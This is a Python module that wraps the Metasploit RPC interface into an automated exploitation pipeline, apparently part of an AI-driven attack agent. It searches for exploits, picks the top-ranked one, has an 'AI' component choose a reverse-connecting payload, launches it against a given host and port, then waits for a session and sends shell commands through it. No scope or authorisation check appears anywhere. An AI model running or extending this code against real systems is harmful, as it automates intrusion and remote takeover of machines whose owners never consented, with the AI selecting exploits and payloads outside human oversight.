
import time
import logging
from pymetasploit3.msfrpc import MsfRpcClient
from typing import Optional, List, Dict, Any
from modules.payload_crafter import PayloadCrafter
from config.config_manager import ConfigManager

# Configure logger
logger = logging.getLogger(__name__)

class MetasploitClient:
    """
    A wrapper for the Metasploit RPC client (pymetasploit3) to provide
    a stable and programmatic interface for searching, configuring,
    and running exploits.
    """
    def __init__(self, password: str, user: str = 'msf', host: str = '127.0.0.1', port: int = 55553):
        self.password = password
        self.user = user
        self.host = host
        self.port = port
        self.client: Optional[MsfRpcClient] = None

    def connect(self) -> bool:
        """Connect to the Metasploit RPC server."""
        try:
            self.client = MsfRpcClient(self.password, user=self.user, server=self.host, port=self.port, ssl=True)
            logger.info(f"Successfully connected to Metasploit RPC on {self.host}:{self.port}")
            return True
        except Exception as e:
            logger.error(f"Failed to connect to Metasploit RPC server: {e}")
            logger.error("Please ensure Metasploit is running and 'msfrpcd -P your_password' is active.")
            self.client = None
            return False

    def search_exploits(self, query: str) -> List[Dict[str, Any]]:
        """Search for exploits in the Metasploit framework."""
        if not self.client:
            logger.error("Not connected to Metasploit. Cannot search for exploits.")
            return []
        
        logger.info(f"Searching for exploits matching: '{query}'")
        try:
            search_results = self.client.modules.search(query)
            exploits = [{'fullname': m['fullname'], 'name': m['name'], 'rank': m['rank']} 
                        for m in search_results if 'exploit/' in m['fullname']]
            logger.info(f"Found {len(exploits)} potential exploits.")
            return exploits
        except Exception as e:
            logger.error(f"Error searching for exploits: {e}")
            return []

    def execute_exploit(self, exploit_name: str, target_host: str, target_port: int, payload_config: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Run a specific exploit with a given payload configuration."""
        if not self.client:
            logger.error("Not connected to Metasploit. Cannot run exploit.")
            return None

        if not payload_config or 'name' not in payload_config:
            logger.error("Invalid payload configuration provided.")
            return None

        try:
            logger.info(f"Configuring exploit '{exploit_name}' for target {target_host}:{target_port}")
            exploit = self.client.modules.use('exploit', exploit_name)
            exploit['RHOSTS'] = target_host
            exploit['RPORT'] = target_port

            payload_name = payload_config['name']
            payload = self.client.modules.use('payload', payload_name)

            if 'options' in payload_config and isinstance(payload_config['options'], dict):
                for option, value in payload_config['options'].items():
                    logger.info(f"Setting payload option {option}={value}")
                    payload[option] = value

            logger.info(f"Executing exploit with AI-suggested payload {payload_name}...")
            job_info = exploit.execute(payload=payload)

            if not job_info or 'job_id' not in job_info:
                logger.error("Exploit execution failed to start a job.")
                return None

            job_id = job_info['job_id']
            logger.info(f"Exploit launched as job ID: {job_id}. Waiting for a session...")

            # Wait up to 60 seconds for a session to be created
            for _ in range(60):
                if self.client.sessions.list:
                    # Get the most recent session
                    session_id = list(self.client.sessions.list.keys())[-1]
                    logger.success(f"SUCCESS! Session {session_id} opened on target {target_host}")
                    return self.client.sessions.list.get(session_id)
                time.sleep(1)
            
            logger.warning("Exploit finished, but no session was opened.")
            return None

        except Exception as e:
            logger.error(f"An error occurred while running the exploit: {e}")
            return None

    def get_session(self, session_id: str) -> Optional[Any]:
        """Get a session object by its ID."""
        if self.client and self.client.sessions.list.get(session_id):
            return self.client.sessions.session(session_id)
        return None

    def interact_with_session(self, session, command: str):
        """Send a command to an active session and read the output."""
        if not session:
            logger.error("Invalid session provided.")
            return
        
        logger.info(f"Executing command on session {session.sid}: '{command}'")
        session.write(command + '\n')
        time.sleep(2) # Wait for command to execute
        output = session.read()
        logger.info(f"Session output:\n{output}")
        return output

# This class will be the main interface for the agent
class ExploitationModule:
    def __init__(self, msf_password: str):
        self.msf_client = MetasploitClient(password=msf_password)
        self.payload_crafter = PayloadCrafter()
        self.config = ConfigManager()
        self.active_session = None

    def run(self, target_host: str, target_port: int, exploit_query: str):
        if not self.msf_client.connect():
            return

        exploits = self.msf_client.search_exploits(exploit_query)
        if not exploits:
            logger.warning(f"No exploits found for query: {exploit_query}")
            return

        # Let the AI choose the best exploit later. For now, use the highest-ranked one.
        best_exploit_info = sorted(exploits, key=lambda x: x.get('rank', 0), reverse=True)[0]
        best_exploit_name = best_exploit_info['fullname'].replace('exploit/', '')
        logger.info(f"Selected best-ranked exploit: {best_exploit_name} (Rank: {best_exploit_info.get('rank')}) ")

        # Use AI to suggest a payload
        context = {
            'exploit_name': best_exploit_name,
            'target_os': 'windows' if 'windows' in best_exploit_name else 'linux',
            'lhost': self.config.get_setting('attack.lhost', '127.0.0.1'),
            'lport': self.config.get_setting('attack.lport', 4444)
        }
        payload_config = self.payload_crafter.suggest_msf_payload(context)

        if not payload_config:
            logger.error("AI failed to suggest a payload. Aborting exploitation attempt.")
            return

        session_info = self.msf_client.execute_exploit(best_exploit_name, target_host, target_port, payload_config)
        if session_info:
            # The session ID is the key in the sessions.list dictionary
            session_id = list(self.msf_client.client.sessions.list.keys())[-1]
            self.active_session = self.msf_client.get_session(session_id)
            logger.info("Exploitation successful. Active session established.")
            # Further post-exploitation can be triggered from here
        else:
            logger.error("Exploitation failed.")

